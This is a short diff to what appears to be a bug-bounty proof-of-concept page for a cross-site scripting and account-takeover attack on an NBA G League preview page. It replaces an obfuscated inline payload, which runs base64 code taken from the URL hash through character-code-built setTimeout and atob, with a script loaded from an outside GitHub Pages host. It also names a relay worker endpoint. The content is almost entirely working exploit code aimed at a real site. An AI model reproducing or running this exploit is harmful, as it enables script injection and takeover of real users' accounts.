@@ -20,6 +20,7 @@
 <script>
   const WORKER = "https://nba-rendezvous-ato-poc.h1-3989880-research.workers.dev";
   const TARGET = "https://gleague.nba.com/block-preview";
+  const LOADER = "https://the-good-tiger.github.io/nba-videopack-xss-poc/gleague-loader.js";
   const CLEAN_URL = `${location.origin}${location.pathname}`;
   const SESSION_KEY = "nba-gleague-rendezvous-ato-poc";
   const status = document.getElementById("status");
@@ -51,7 +52,7 @@
       scriptLoader: [{
         id: "NBA_GLEAGUE_RENDEZVOUS_ATO",
         strategy: "afterInteractive",
-        dangerouslySetInnerHTML: { __html: `top[${charCodeExpression("setTimeout")}](top[${charCodeExpression("atob")}](top.location.hash.slice(1)),0)` }
+        src: LOADER
       }]
     };
     const attrs = {
